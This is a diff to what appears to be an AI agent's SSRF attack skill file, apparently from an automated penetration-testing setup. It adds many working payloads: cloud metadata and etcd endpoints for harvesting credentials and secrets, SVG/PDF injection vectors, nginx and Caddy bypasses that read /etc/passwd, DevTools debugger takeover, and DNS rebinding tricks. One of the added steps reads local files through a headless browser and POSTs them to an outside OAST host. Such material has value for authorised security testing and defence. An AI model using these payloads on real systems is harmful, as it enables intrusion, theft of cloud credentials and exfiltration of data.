@@ -1,7 +1,36 @@
 ---
 name: ssrf
 description: >-
-  Use ssrf when recon shows the server can be made to fetch a resource on your behalf, meaning a request parameter, form field, JSON body key, or GraphQL argument whose value looks like a URL, hostname, or path (names such as url, uri, link, src, dest, target, redirect, redirect_uri, next, return, callback, webhook, fetch, load, proxy, forward, feed, domain, host, endpoint, api, image, avatar, logo, document, or pdf), especially when the field already holds a full http(s) value. Strong routing signals include any feature whose described purpose is server-initiated retrieval: import-from-URL, fetch-by-link, link preview or unfurl, test-webhook buttons, screenshot or PDF or report exporters, RSS/ICS/Atom feed readers, avatar-from-URL, SSO/OIDC discovery and redirect_uri validators, URL health checks, and remote upload. Recon hints that the host runs in a cloud or container environment (AWS/GCP/Azure server headers, Kubernetes ingress or service-mesh sidecar signatures) raise the value further, since internal metadata services may be one fetch away. Also dispatch when the stated objective is reading internal-only data or services the public UI hides. Covers cloud metadata access (AWS IMDSv1/v2, GCP, Azure, ECS task creds), Kubernetes paths (kubelet, API server), internal services (Docker, Redis, Elasticsearch, FastCGI), protocol smuggling (gopher://, dict://, file://, ftp://, jar://, smb://), filter bypass (DNS rebinding, alternative IP formats, URL parser differentials, redirect chains), and blind SSRF detection (OAST, timing, ETag/length diffs). Disambiguate from look-alikes: a URL value reflected verbatim into the page is XSS, not SSRF; a value rendered by a server-side template engine is SSTI; a no-scheme local filesystem path joined into a file read is LFI or path traversal; and a parameter that only changes the client-side Location redirect, with no server-side fetch, is open redirect. SSRF requires the server itself to make the outbound network request.
+  Use: Use ssrf when recon shows the server can be made to fetch a resource on your behalf, meaning
+  a request parameter, form field, JSON body key, or GraphQL argument whose value looks like a URL,
+  hostname, or path (names such as url, uri, link, src, dest, target, redirect, redirect_uri, next,
+  return, callback, webhook, fetch, load, proxy, forward, feed, domain, host, endpoint, api, image,
+  avatar, logo, document, or pdf), especially when the field already holds a full http(s) value.
+  Signals: Strong routing signals include any feature whose described purpose is server-initiated
+  retrieval: import-from-URL, fetch-by-link, link preview or unfurl, test-webhook buttons,
+  screenshot or PDF or report exporters, RSS/ICS/Atom feed readers, avatar-from-URL, SSO/OIDC
+  discovery and redirect_uri validators, URL health checks, and remote upload. Recon hints that the
+  host runs in a cloud or container environment (AWS/GCP/Azure server headers, Kubernetes ingress or
+  service-mesh sidecar signatures) raise the value further, since internal metadata services may be
+  one fetch away. Also dispatch when the stated objective is reading internal-only data or services
+  the public UI hides.
+  Pair with: Also dispatch information-disclosure, deserialization, insecure-file-uploads, xxe in
+  parallel when the same evidence shows those mechanisms too; dispatch chain-ssrf-to-rce later after
+  SSRF is confirmed or when evidence already includes a strong internal-service/cloud-metadata
+  pivot; co-dispatch means separate focused workers sharing the same investigation state, not
+  merging skill prompts.
+  Coverage: Covers cloud metadata access (AWS IMDSv1/v2, GCP, Azure, ECS task creds), Kubernetes
+  paths (kubelet, API server), internal services (Docker, Redis, Elasticsearch, FastCGI), protocol
+  smuggling (gopher://, dict://, file://, ftp://, jar://, smb://), filter bypass (DNS rebinding,
+  alternative IP formats, URL parser differentials, redirect chains), and blind SSRF detection
+  (OAST, timing, ETag/length diffs).
+  Do not use: Disambiguate from look-alikes: a URL value reflected verbatim into the page is XSS,
+  not SSRF; a value rendered by a server-side template engine is SSTI; a no-scheme local filesystem
+  path joined into a file read is LFI or path traversal; and a parameter that only changes the
+  client-side Location redirect, with no server-side fetch, is open redirect. SSRF requires the
+  server itself to make the outbound network request. Do not dispatch when the described input
+  surface is absent, when the value is only stored or echoed without reaching this skill's
+  mechanism, or when another specialist's sink explains the evidence more directly.
 metadata:
   dispatchable: true
 ---
@@ -65,6 +94,10 @@ where allowlists differ between layers.
 - **ECS / EKS task credentials**:
   `http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`
   (also `/v2/credentials`, `/v2/metadata`, `/v3/`).
+- **IPv6 IMDS**: `http://[fd00:ec2::254]/latest/meta-data/` — same data,
+  often missed by IPv4-only allowlists.
+- **Lambda runtime API**: `http://localhost:9001/2018-06-01/runtime/invocation/next`
+  (or `http://${AWS_LAMBDA_RUNTIME_API}/...`) leaks invocation events.
 
 ### GCP
 - Endpoint: `http://metadata.google.internal/computeMetadata/v1/`.
@@ -84,6 +117,10 @@ where allowlists differ between layers.
 - **OpenStack**: `http://169.254.169.254/openstack/latest/meta_data.json`.
 - **Equinix Metal**: `http://169.254.169.254/metadata` (legacy
   `metadata.packet.net` redirects here).
+- **Oracle (alt IP)**: `http://192.0.0.192/latest/` (older OCI / legacy).
+- **Hetzner Cloud**: `http://169.254.169.254/hetzner/v1/metadata`.
+- See `references/cloud-metadata-catalog.md` for the full per-provider
+  path list (Beanstalk, recursive GCP pulls, OAuth token scoping, etc.).
 
 ### Kubernetes
 - Kubelet: 10250 (authenticated) and 10255 (deprecated read-only).
@@ -98,6 +135,9 @@ where allowlists differ between layers.
 - Internal management UIs to probe by DNS:
   `kubernetes-dashboard.kube-system`, `prometheus.monitoring`,
   `grafana.monitoring`, `argocd-server.argocd`, `rancher.cattle-system`.
+- **etcd** (cluster key-value store): `http://127.0.0.1:2379/version`,
+  `http://127.0.0.1:2379/v2/keys/?recursive=true` — can dump API keys,
+  internal IPs/ports, and secrets.
 
 ### Service mesh sidecars
 - **Envoy / Istio admin** (usually localhost-only):
@@ -144,10 +184,16 @@ language-specific wrappers (`php://`, `expect://`) where enabled.
 (HTTP/2 connection coalescing) can bypass host-based filters. Clear-text
 h2c upgrades (`PRI * HTTP/2.0`) may slip past scheme allowlists.
 
-**PDF/SVG SSRF**: when the sink renders SVG (PDF generators,
-chart/report exporters), embed an `<iframe>` inside `<foreignObject>`
-pointing at metadata or internal URLs — the renderer fetches it
-server-side.
+**PDF/SVG SSRF**: when the sink renders SVG or HTML→PDF (PDF
+generators, chart/report exporters), every external reference is
+fetched server-side. Vectors beyond `<iframe>` in `<foreignObject>`:
+`<image xlink:href="http://169.254.169.254/...">`,
+`@import url(http://internal/)` in `<style>`,
+`<?xml-stylesheet href="http://internal/">`, `<use xlink:href>`, and
+`<image xlink:href="expect://id">` where the expect wrapper is on.
+Each `<img>`/`<link>` in an HTML→PDF doc (wkhtmltopdf, TCPDF,
+spipu-html2pdf) is its own blind fetch. See
+`references/svg-pdf-headless.md`.
 
 ### Address variants
 - Loopback: `127.0.0.1`, `127.1`, `2130706433`, `0x7f000001`, `::1`,
@@ -181,6 +227,49 @@ server-side.
 - Weak parser tricks: `http://127.1.1.1:80\@127.2.2.2:80/`,
   `0://evil.com:80;http://internal:80/`.
 
+### Reverse-proxy misconfiguration
+The proxy layer is its own SSRF and access-control surface. The
+allowlist on the proxy and the URL the back-end actually fetches
+often disagree.
+- **Open forward-proxy**: a reverse proxy that accepts an absolute-form
+  request line (`GET http://127.0.0.1:8080/ HTTP/1.1`) will fetch
+  internal hosts for you — full-read SSRF if you get the body back.
+- **Spoofable client-IP headers**: `X-Forwarded-For`, `X-Real-IP`,
+  `True-Client-IP` (Akamai) are plain headers. If the proxy does not
+  strip/override them, set one to `127.0.0.1` to spoof a trusted-origin
+  request and reach IP-gated internal routes.
+- **Nginx alias off-by-slash**: `location /styles { alias /path/css/; }`
+  (no trailing slash) lets `/styles../secret.txt` resolve to
+  `/path/css/../secret.txt` — directory traversal above the alias root.
+- **Nginx missing root location**: with `root /etc/nginx;` and no
+  `location /`, a request like `/nginx.conf` serves
+  `/etc/nginx/nginx.conf` directly.
+- **Caddy `templates` SSTI**: if a header value is rendered through Go
+  templates, `Referer: {{readFile "/etc/passwd"}}` (also `{{env "VAR"}}`,
+  `{{listFiles "/"}}`) reads files into the response.
+- **403/40X path-bypass**: a path blocked at the proxy is often reachable
+  via casing, trailing chars, encoded slashes, or added segments
+  (`/admin..;/`, `/admin/.`, `/%2e/admin`). See `references/reverse-proxy.md`.
+
+### Headless-browser SSRF
+PDF/screenshot exporters and link-preview features usually drive a
+headless Chrome/Firefox. Two distinct issues:
+- **Server-side fetch of a user-controlled URL**: when you control the
+  rendered URL, point the page at internal targets via JS redirect
+  (`window.location="http://169.254.169.254/..."`), an `<iframe>`, or
+  `fetch()`. If the browser ran with `--allow-file-access` /
+  `--disable-web-security`, `fetch("file:///etc/passwd")` then POST the
+  text to your OAST host.
+- **Exposed DevTools / inspector port**: Chrome `--remote-debugging-port`
+  (default **9222**) and Node `--inspect` (default **9229**) expose a
+  control protocol. SSRF to `http://127.0.0.1:9222/json/version` leaks
+  the browser UUID + `webSocketDebuggerUrl`; `/json/new?<url>` opens
+  tabs (loop it as an internal port scanner). Reachable WS debugger =
+  full browser control (read tabs, cookies, history).
+- **Browser-based port scan**: time `<img>`-tag `onerror` for guessed
+  internal `host:port`; closed ports error faster than open ones.
+See `references/svg-pdf-headless.md`.
+
 ## Filter and WAF bypass
 
 - **Address encoding** — decimal, hex, octal IPs; IPv6 variants;
@@ -189,6 +278,12 @@ server-side.
   internal target. Short TTL DNS records under attacker control. Modern
   services: `1u.ms` (e.g. `http://1u.ms/A-127.0.0.1:1-2`), `rbndr.us`
   (`http://make-1.2.3.4-127.0.0.1-rbndr.us`), Singularity of Origin.
+  When the resolver blocks RFC1918/loopback answers: rebind to `0.0.0.0`
+  (still reaches loopback on many stacks, evades a `127.0.0.0/8` block),
+  or return a **CNAME to an internal name** / `localhost` so the
+  perimeter filter (which only checks A-record IPs) never sees a private
+  address. In a headless browser, the split-second IPv6→IPv4 fallback
+  trick rebinds within one page load. See `references/dns-rebinding.md`.
 - **DNS-over-HTTPS leak** — `https://dns.google/resolve?name=...` from
   a sink to enumerate internal hostnames without direct egress.
 - **URL-parser differentials** — the allowlist parser disagrees with the
